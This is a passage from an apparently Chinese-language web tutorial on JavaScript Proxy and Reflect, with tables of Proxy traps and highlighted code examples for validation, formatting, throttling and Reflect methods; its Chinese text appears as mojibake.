align="left">æ‹¦æˆªå±æ€§è®¾ç½®</td><td align="left">proxy.property &#x3D; value</td></tr><tr><td align="left">has(target, property)</td><td align="left">æ‹¦æˆª in æ“ä½œç¬¦</td><td align="left">property in proxy</td></tr><tr><td align="left">apply(target, object, args)</td><td align="left">æ‹¦æˆªå‡½æ•°è°ƒç”¨</td><td align="left">proxy(â€¦args), proxy.call(), proxy.apply()</td></tr><tr><td align="left">construct(target, args)</td><td align="left">æ‹¦æˆª new æ“ä½œç¬¦</td><td align="left">new proxy(â€¦args)</td></tr><tr><td align="left">deleteProperty(target, property)</td><td align="left">æ‹¦æˆª delete æ“ä½œç¬¦</td><td align="left">delete proxy.property</td></tr><tr><td align="left">ownKeys(target)</td><td align="left">æ‹¦æˆªå¯¹è±¡å±æ€§æšä¸¾</td><td align="left">Object.keys(proxy), Object.getOwnPropertyNames(proxy)</td></tr><tr><td align="left">getOwnPropertyDescriptor(target, property)</td><td align="left">æ‹¦æˆªå±æ€§æè¿°ç¬¦è·å–</td><td align="left">Object.getOwnPropertyDescriptor(proxy, property)</td></tr><tr><td align="left">defineProperty(target, property, propDesc)</td><td align="left">æ‹¦æˆªå±æ€§å®šä¹‰</td><td align="left">Object.defineProperty(proxy, property, descriptor)</td></tr><tr><td align="left">getPrototypeOf(target)</td><td align="left">æ‹¦æˆªåŸå‹è·å–</td><td align="left">Object.getPrototypeOf(proxy)</td></tr><tr><td align="left">setPrototypeOf(target, proto)</td><td align="left">æ‹¦æˆªåŸå‹è®¾ç½®</td><td align="left">Object.setPrototypeOf(proxy, prototype)</td></tr><tr><td align="left">isExtensible(target)</td><td align="left">æ‹¦æˆªå¯¹è±¡å¯æ‰©å±•æ€§æ£€æŸ¥</td><td align="left">Object.isExtensible(proxy)</td></tr><tr><td align="left">preventExtensions(target)</td><td align="left">æ‹¦æˆªé˜»æ­¢æ‰©å±•æ“ä½œ</td><td align="left">Object.preventExtensions(proxy)</td></tr></tbody></table><h3 id="Proxy-å’Œ-Object-defineProperty-çš„å…³ç³»"><a href="#Proxy-å’Œ-Object-defineProperty-çš„å…³ç³»" class="headerlink" title="Proxy å’Œ Object.defineProperty çš„å…³ç³»"></a>Proxy å’Œ Object.defineProperty çš„å…³ç³»</h3><p><strong>æ ¸å¿ƒæ¦‚å¿µå¯¹æ¯”</strong></p><table><thead><tr><th align="left">ç‰¹æ€§</th><th align="left">Object.defineProperty</th><th align="left">Proxy</th></tr></thead><tbody><tr><td align="left">å¼•å…¥æ—¶é—´</td><td align="left">ES5 (2009)</td><td align="left">ES6 (2015)</td></tr><tr><td align="left">ä¸»è¦ç›®çš„</td><td align="left">å®šä¹‰&#x2F;ä¿®æ”¹å¯¹è±¡å±æ€§çš„ç‰¹æ€§</td><td align="left">åˆ›å»ºå¯¹è±¡çš„ä»£ç†ï¼Œæ‹¦æˆªåŸºæœ¬æ“ä½œ</td></tr><tr><td align="left">æ“ä½œçº§åˆ«</td><td align="left">å±æ€§çº§åˆ«</td><td align="left">å¯¹è±¡çº§åˆ«</td></tr><tr><td align="left">æ‹¦æˆªèƒ½åŠ›</td><td align="left">æœ‰é™ï¼ˆä¸»è¦æ˜¯ get&#x2F;setï¼‰</td><td align="left">å…¨é¢ï¼ˆ13ç§æ“ä½œï¼‰</td></tr><tr><td align="left">æ–°å¢å±æ€§</td><td align="left">æ— æ³•è‡ªåŠ¨æ•è·</td><td align="left">å¯ä»¥è‡ªåŠ¨æ•è·</td></tr><tr><td align="left">è¿”å›å€¼</td><td align="left">ä¿®æ”¹åçš„å¯¹è±¡</td><td align="left">æ–°åˆ›å»ºçš„ä»£ç†å¯¹è±¡</td></tr></tbody></table><p><strong>åŠŸèƒ½å…³ç³»è¯¦è§£</strong></p><p>ï¼ˆ1ï¼‰ç›¸ä¼¼ä¹‹å¤„ï¼šå±æ€§è®¿é—®æ‹¦æˆª</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// ä½¿ç”¨ Object.defineProperty</span><br><span class="hljs-keyword">const</span> obj1 = &#123;&#125;;<br><span class="hljs-keyword">let</span> value = <span class="hljs-number">10</span>;<br><br><span class="hljs-title class_">Object</span>.<span class="hljs-title function_">defineProperty</span>(obj1, <span class="hljs-string">&#x27;count&#x27;</span>, &#123;<br>  <span class="hljs-title function_">get</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;è·å– count&#x27;</span>);<br>    <span class="hljs-keyword">return</span> value;<br>  &#125;,<br>  <span class="hljs-title function_">set</span>(<span class="hljs-params">newValue</span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;è®¾ç½® count&#x27;</span>);<br>    value = newValue;<br>  &#125;<br>&#125;);<br><br>obj1.<span class="hljs-property">count</span>; <span class="hljs-comment">// æ§åˆ¶å°: &quot;è·å– count&quot;</span><br>obj1.<span class="hljs-property">count</span> = <span class="hljs-number">20</span>; <span class="hljs-comment">// æ§åˆ¶å°: &quot;è®¾ç½® count&quot;</span><br><br><span class="hljs-comment">// ä½¿ç”¨ Proxy</span><br><span class="hljs-keyword">const</span> target = &#123;&#125;;<br><span class="hljs-keyword">const</span> proxy = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Proxy</span>(target, &#123;<br>  <span class="hljs-title function_">get</span>(<span class="hljs-params">target, prop</span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`è·å– <span class="hljs-subst">$&#123;prop&#125;</span>`</span>);<br>    <span class="hljs-keyword">return</span> target[prop];<br>  &#125;,<br>  <span class="hljs-title function_">set</span>(<span class="hljs-params">target, prop, value</span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`è®¾ç½® <span class="hljs-subst">$&#123;prop&#125;</span> ä¸º <span class="hljs-subst">$&#123;value&#125;</span>`</span>);<br>    target[prop] = value;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>  &#125;<br>&#125;);<br><br>proxy.<span class="hljs-property">name</span>; <span class="hljs-comment">// æ§åˆ¶å°: &quot;è·å– name&quot;</span><br>proxy.<span class="hljs-property">age</span> = <span class="hljs-number">30</span>; <span class="hljs-comment">// æ§åˆ¶å°: &quot;è®¾ç½® age ä¸º 30&quot;</span><br></code></pre></td></tr></table></figure><p>ï¼ˆ2ï¼‰äº’è¡¥å…³ç³»ï¼šProxy æ‰©å±•äº† defineProperty çš„èƒ½åŠ›</p><p><strong>æ ¸å¿ƒåŒºåˆ«</strong></p><ul><li>æ‹¦æˆªèŒƒå›´ä¸åŒï¼šdefineProperty åªèƒ½æ‹¦æˆªå±æ€§çš„è¯»å†™æ“ä½œï¼ˆå±æ€§çº§åˆ«ï¼‰ï¼Œæ— æ³•æ‹¦æˆªå±æ€§æ–°å¢ã€åˆ é™¤ç­‰æ“ä½œï¼ŒProxy å¯ä»¥æ‹¦æˆªæ•´ä¸ªå¯¹è±¡çš„å¤šç§æ“ä½œï¼ˆå¯¹è±¡çº§åˆ«ï¼‰</li><li>Proxy è¿”å›ä¿®å¯¹è±¡ï¼ŒdefineProperty ä¿®æ”¹åŸå¯¹è±¡</li></ul><h3 id="this-é—®é¢˜"><a href="#this-é—®é¢˜" class="headerlink" title="this é—®é¢˜"></a>this é—®é¢˜</h3><p>Proxy ä»£ç†ç›®æ ‡å¯¹è±¡æ—¶ï¼Œç›®æ ‡å¯¹è±¡å†…éƒ¨çš„ this ä¼šæŒ‡å‘ Proxy ä»£ç†</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> target = &#123;<br>  <span class="hljs-attr">m</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span> === proxy);<br>  &#125;<br>&#125;;<br><span class="hljs-keyword">const</span> handler = &#123;&#125;;<br><br><span class="hljs-keyword">const</span> proxy = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Proxy</span>(target, handler);<br><br>target.<span class="hljs-title function_">m</span>() <span class="hljs-comment">// false</span><br>proxy.<span class="hljs-title function_">m</span>()  <span class="hljs-comment">// true</span><br></code></pre></td></tr></table></figure><p>æ­¤å¤–ï¼Œæœ‰äº›åŸç”Ÿå¯¹è±¡çš„å†…éƒ¨å±æ€§ï¼Œåªæœ‰é€šè¿‡æ­£ç¡®çš„ this æ‰èƒ½æ‹¿åˆ°ï¼Œæ‰€ä»¥ Proxy æ— æ³•ä»£ç†è¿™äº›åŸç”Ÿå¯¹è±¡çš„å±æ€§</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> target = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>();<br><span class="hljs-keyword">const</span> handler = &#123;&#125;;<br><span class="hljs-keyword">const</span> proxy = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Proxy</span>(target, handler);<br><br>proxy.<span class="hljs-title function_">getDate</span>();<br><span class="hljs-comment">// TypeError: this is not a Date object.</span><br></code></pre></td></tr></table></figure><h3 id="å®é™…åº”ç”¨åœºæ™¯"><a href="#å®é™…åº”ç”¨åœºæ™¯" class="headerlink" title="å®é™…åº”ç”¨åœºæ™¯"></a>å®é™…åº”ç”¨åœºæ™¯</h3><p><strong>æ•°æ®éªŒè¯</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> validator = &#123;<br>  <span class="hljs-title function_">set</span>(<span class="hljs-params">target, prop, value</span>) &#123;<br>    <span class="hljs-keyword">if</span> (prop === <span class="hljs-string">&#x27;age&#x27;</span>) &#123;<br>      <span class="hljs-keyword">if</span> (!<span class="hljs-title class_">Number</span>.<span class="hljs-title function_">isInteger</span>(value)) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TypeError</span>(<span class="hljs-string">&#x27;å¹´é¾„å¿…é¡»æ˜¯æ•´æ•°&#x27;</span>);<br>      &#125;<br>      <span class="hljs-keyword">if</span> (value &lt; <span class="hljs-number">0</span> || value &gt; <span class="hljs-number">150</span>) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RangeError</span>(<span class="hljs-string">&#x27;å¹´é¾„å¿…é¡»åœ¨0-150ä¹‹é—´&#x27;</span>);<br>      &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">set</span>(...<span class="hljs-variable language_">arguments</span>);<br>  &#125;<br>&#125;;<br><br><span class="hljs-keyword">const</span> person = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Proxy</span>(&#123;&#125;, validator);<br>person.<span class="hljs-property">age</span> = <span class="hljs-number">30</span>; <span class="hljs-comment">// æ­£å¸¸</span><br>person.<span class="hljs-property">age</span> = <span class="hljs-string">&#x27;thirty&#x27;</span>; <span class="hljs-comment">// æŠ›å‡ºç±»å‹é”™è¯¯</span><br></code></pre></td></tr></table></figure><p><strong>è‡ªåŠ¨æ ¼å¼åŒ–</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> formatter = &#123;<br>  <span class="hljs-title function_">get</span>(<span class="hljs-params">target, prop</span>) &#123;<br>    <span class="hljs-keyword">const</span> value = <span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">get</span>(...<span class="hljs-variable language_">arguments</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">typeof</span> value === <span class="hljs-string">&#x27;number&#x27;</span> ? <span class="hljs-string">`$<span class="hljs-subst">$&#123;value.toFixed(<span class="hljs-number">2</span>)&#125;</span>`</span> : value;<br>  &#125;<br>&#125;;<br><br><span class="hljs-keyword">const</span> prices = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Proxy</span>(&#123; <span class="hljs-attr">apple</span>: <span class="hljs-number">1.2</span>, <span class="hljs-attr">banana</span>: <span class="hljs-number">0.8</span> &#125;, formatter);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(prices.<span class="hljs-property">apple</span>); <span class="hljs-comment">// $1.20</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(prices.<span class="hljs-property">banana</span>); <span class="hljs-comment">// $0.80</span><br></code></pre></td></tr></table></figure><p><strong>è‡ªåŠ¨å¡«å……å¯¹è±¡</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> autoFill = &#123;<br>  <span class="hljs-title function_">get</span>(<span class="hljs-params">target, prop</span>) &#123;<br>    <span class="hljs-keyword">if</span> (!(prop <span class="hljs-keyword">in</span> target)) &#123;<br>      target[prop] = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Proxy</span>(&#123;&#125;, autoFill);<br>    &#125;<br>    <span class="hljs-keyword">return</span> target[prop];<br>  &#125;<br>&#125;;<br><br><span class="hljs-keyword">const</span> obj = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Proxy</span>(&#123;&#125;, autoFill);<br>obj.<span class="hljs-property">a</span>.<span class="hljs-property">b</span>.<span class="hljs-property">c</span> = <span class="hljs-string">&#x27;value&#x27;</span>;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(obj.<span class="hljs-property">a</span>.<span class="hljs-property">b</span>.<span class="hljs-property">c</span>); <span class="hljs-comment">// &#x27;value&#x27;</span><br></code></pre></td></tr></table></figure><p><strong>å‡½æ•°èŠ‚æµ</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> <span class="hljs-title function_">throttle</span> = (<span class="hljs-params">fn, delay</span>) =&gt; &#123;<br>  <span class="hljs-keyword">let</span> lastCall = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Proxy</span>(fn, &#123;<br>    <span class="hljs-title function_">apply</span>(<span class="hljs-params">target, thisArg, args</span>) &#123;<br>      <span class="hljs-keyword">const</span> now = <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>();<br>      <span class="hljs-keyword">if</span> (now - lastCall &lt; delay) &#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;è°ƒç”¨å¤ªé¢‘ç¹ï¼Œè¢«èŠ‚æµ&#x27;</span>);<br>        <span class="hljs-keyword">return</span>;<br>      &#125;<br>      lastCall = now;<br>      <span class="hljs-keyword">return</span> <span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">apply</span>(target, thisArg, args);<br>    &#125;<br>  &#125;);<br>&#125;;<br><br><span class="hljs-keyword">const</span> <span class="hljs-title function_">expensiveFn</span> = (<span class="hljs-params"></span>) =&gt; <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;æ‰§è¡Œæ“ä½œ&#x27;</span>);<br><span class="hljs-keyword">const</span> throttledFn = <span class="hljs-title function_">throttle</span>(expensiveFn, <span class="hljs-number">1000</span>);<br><br><span class="hljs-comment">// æµ‹è¯•</span><br><span class="hljs-title function_">throttledFn</span>(); <span class="hljs-comment">// æ‰§è¡Œæ“ä½œ</span><br><span class="hljs-title function_">throttledFn</span>(); <span class="hljs-comment">// è°ƒç”¨å¤ªé¢‘ç¹ï¼Œè¢«èŠ‚æµ</span><br><span class="hljs-built_in">setTimeout</span>(throttledFn, <span class="hljs-number">1100</span>); <span class="hljs-comment">// æ‰§è¡Œæ“ä½œ</span><br></code></pre></td></tr></table></figure><h3 id="æ³¨æ„äº‹é¡¹"><a href="#æ³¨æ„äº‹é¡¹" class="headerlink" title="æ³¨æ„äº‹é¡¹"></a>æ³¨æ„äº‹é¡¹</h3><ol><li>Reflect APIï¼šé€šå¸¸ä¸ Reflect å¯¹è±¡é…åˆä½¿ç”¨ï¼Œç¡®ä¿æ­£ç¡®çš„ this ç»‘å®š</li><li>æ€§èƒ½å½±å“ï¼šProxy æ“ä½œæ¯”ç›´æ¥è®¿é—®å±æ€§æ…¢ï¼Œé¿å…åœ¨æ€§èƒ½å…³é”®è·¯å¾„ä¸Šè¿‡åº¦ä½¿ç”¨</li><li>ç›®æ ‡å¯¹è±¡ä¸å¯å˜ï¼šProxy ä»£ç†ä¸ä¼šæ”¹å˜ç›®æ ‡å¯¹è±¡æœ¬èº«</li><li>this ç»‘å®šï¼šProxy å†…éƒ¨æ–¹æ³•ä¸­çš„ this æŒ‡å‘ handler å¯¹è±¡</li><li>å¯æ’¤é”€ä»£ç†ï¼šå¯ä»¥ä½¿ç”¨ Proxy.revocable() åˆ›å»ºå¯æ’¤é”€çš„ä»£ç†</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> &#123; proxy, revoke &#125; = <span class="hljs-title class_">Proxy</span>.<span class="hljs-title function_">revocable</span>(&#123;&#125;, &#123;&#125;);<br><span class="hljs-title function_">revoke</span>(); <span class="hljs-comment">// æ­¤åå¯¹ä»£ç†çš„ä»»ä½•æ“ä½œéƒ½ä¼šæŠ›å‡ºé”™è¯¯</span><br></code></pre></td></tr></table></figure><h2 id="Reflect-è¯¦è§£"><a href="#Reflect-è¯¦è§£" class="headerlink" title="Reflect è¯¦è§£"></a>Reflect è¯¦è§£</h2><h3 id="ä»€ä¹ˆæ˜¯Reflectï¼Ÿ"><a href="#ä»€ä¹ˆæ˜¯Reflectï¼Ÿ" class="headerlink" title="ä»€ä¹ˆæ˜¯Reflectï¼Ÿ"></a>ä»€ä¹ˆæ˜¯Reflectï¼Ÿ</h3><p>Reflect æ˜¯ ES6 å¼•å…¥çš„ä¸€ä¸ªå†…ç½®å¯¹è±¡ï¼Œå®ƒæä¾›äº†ä¸€ç»„é™æ€æ–¹æ³•ç”¨äºæ“ä½œå¯¹è±¡ï¼Œè¿™äº›æ–¹æ³•ä¸ Proxy çš„æ‹¦æˆªæ–¹æ³•ä¸€ä¸€å¯¹åº”ã€‚Reflect çš„è®¾è®¡ç›®çš„æ˜¯ä¸ºäº†ï¼š</p><p>ï¼ˆ1ï¼‰å°†ä¸€äº›æ˜æ˜¾å±äºè¯­è¨€å†…éƒ¨çš„æ–¹æ³•è½¬ç§»åˆ° JavaScript ä»£ç å±‚ï¼Œæ¯”å¦‚ Object.defineProperty æœªæ¥åªèƒ½é€šè¿‡ Reflect å¯¹è±¡è®¿é—®</p><p>ï¼ˆ2ï¼‰æä¾›æ›´åˆç†çš„è¿”å›å€¼ï¼ˆç”¨å¸ƒå°”å€¼ä»£æ›¿æŠ›å‡ºå¼‚å¸¸ï¼‰</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// è€å†™æ³•</span><br><span class="hljs-keyword">try</span> &#123;<br>  <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">defineProperty</span>(target, property, attributes);<br>  <span class="hljs-comment">// success</span><br>&#125; <span class="hljs-keyword">catch</span> (e) &#123;<br>  <span class="hljs-comment">// failure</span><br>&#125;<br><br><span class="hljs-comment">// æ–°å†™æ³•</span><br><span class="hljs-keyword">if</span> (<span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">defineProperty</span>(target, property, attributes)) &#123;<br>  <span class="hljs-comment">// success</span><br>&#125; <span class="hljs-keyword">else</span> &#123;<br>  <span class="hljs-comment">// failure</span><br>&#125;<br></code></pre></td></tr></table></figure><p>ï¼ˆ3ï¼‰ç»Ÿä¸€æ“ä½œå¯¹è±¡çš„å‡½æ•°å¼ APIï¼Œå°†å¯¹è±¡æ“ä½œéƒ½å˜æˆå‡½æ•°å¼è¡Œä¸º</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// è€å†™æ³•</span><br><span class="hljs-string">&#x27;assign&#x27;</span> <span class="hljs-keyword">in</span> <span class="hljs-title class_">Object</span> <span class="hljs-comment">// true</span><br><br><span class="hljs-comment">// æ–°å†™æ³•</span><br><span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">has</span>(<span class="hljs-title class_">Object</span>, <span class="hljs-string">&#x27;assign&#x27;</span>) <span class="hljs-comment">// true</span><br><br></code></pre></td></tr></table></figure><p>ï¼ˆ4ï¼‰ä¸º Proxy æä¾›é»˜è®¤è¡Œä¸ºçš„åŸºç¡€æ–¹æ³•ï¼Œè®© Proxy å¯¹è±¡å¯ä»¥æ›´æ–¹ä¾¿çš„è°ƒç”¨å¯¹åº”çš„ Reflect æ–¹æ³•ï¼Œå®Œæˆé»˜è®¤è¡Œä¸º</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">var</span> obj = &#123;&#125;<br><span class="hljs-keyword">var</span> obj2 = &#123;&#125;<br><span class="hljs-keyword">var</span> proxyHandler = &#123;<br>  <span class="hljs-title function_">set</span>(<span class="hljs-params">target, property, value</span>) &#123;<br>    <span class="hljs-comment">// todo</span><br>  &#125;<br>&#125;<br><span class="hljs-keyword">var</span> reflectHandler = &#123;<br>  <span class="hljs-title function_">set</span>(<span class="hljs-params">target, property, value</span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">set</span>(...<span class="hljs-variable language_">arguments</span>)<br>  &#125;<br>&#125;<br><span class="hljs-keyword">var</span> proxyObj = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Proxy</span>(obj, proxyHandler)<br><span class="hljs-keyword">var</span> reflectObj = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Proxy</span>(obj2, reflectHandler)<br><br>proxyObj.<span class="hljs-property">a</span> = <span class="hljs-number">1</span><br>reflectObj.<span class="hljs-property">a</span> = <span class="hljs-number">1</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(proxyObj) <span class="hljs-comment">// &#123;&#125;</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(reflectObj) <span class="hljs-comment">// &#123;a: 1&#125;</span><br></code></pre></td></tr></table></figure><h3 id="Reflect-æ ¸å¿ƒæ–¹æ³•è¯¦è§£"><a href="#Reflect-æ ¸å¿ƒæ–¹æ³•è¯¦è§£" class="headerlink" title="Reflect æ ¸å¿ƒæ–¹æ³•è¯¦è§£"></a>Reflect æ ¸å¿ƒæ–¹æ³•è¯¦è§£</h3><p><strong>Reflect.get(target, propertyKey[, receiver])</strong></p><ul><li>è·å–å¯¹è±¡å±æ€§çš„å€¼</li><li>ç­‰åŒäº target[propertyKey]</li><li>receiver å‚æ•°å¯ä»¥æ”¹å˜ getter ä¸­çš„ this æŒ‡å‘</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> obj = &#123; <span class="hljs-attr">x</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">y</span>: <span class="hljs-number">2</span> &#125;;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">get</span>(obj, <span class="hljs-string">&#x27;x&#x27;</span>)); <span class="hljs-comment">// 1</span><br><br><span class="hljs-comment">// æ”¹å˜ getter ä¸­çš„ this</span><br><span class="hljs-keyword">const</span> obj2 = &#123;<br>  <span class="hljs-attr">foo</span>: <span class="hljs-number">1</span>,<br>  <span class="hljs-keyword">get</span> <span class="hljs-title function_">bar</span>() &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">foo</span>;<br>  &#125;<br>&#125;;<br><span class="hljs-keyword">const</span> receiver = &#123; <span class="hljs-attr">foo</span>: <span class="hljs-number">2</span> &#125;;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">get</span>(obj2, <span class="hljs-string">&#x27;bar&#x27;</span>, receiver)); <span class="hljs-comment">// 2</span><br></code></pre></td></tr></table></figure><p><strong>Reflect.set(target, propertyKey, value[, receiver])</strong></p><ul><li>è®¾ç½®å¯¹è±¡å±æ€§çš„å€¼</li><li>ç­‰åŒäº target[propertyKey] &#x3D; value</li><li>è¿”å›å¸ƒå°”å€¼è¡¨ç¤ºæ˜¯å¦è®¾ç½®æˆåŠŸ</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> obj = &#123;&#125;;<br><span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">set</span>(obj, <span class="hljs-string">&#x27;name&#x27;</span>, <span class="hljs-string">&#x27;Alice&#x27;</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(obj.<span class="hljs-property">name</span>); <span class="hljs-comment">// &#x27;Alice&#x27;</span><br><br><span class="hljs-comment">// æ”¹å˜ setter ä¸­çš„ this</span><br><span class="hljs-keyword">const</span> obj2 = &#123;<br>  <span class="hljs-keyword">set</span> <span class="hljs-title function_">prop</span>(<span class="hljs-params">value</span>) &#123;<br>    <span class="hljs-keyword">return</span> 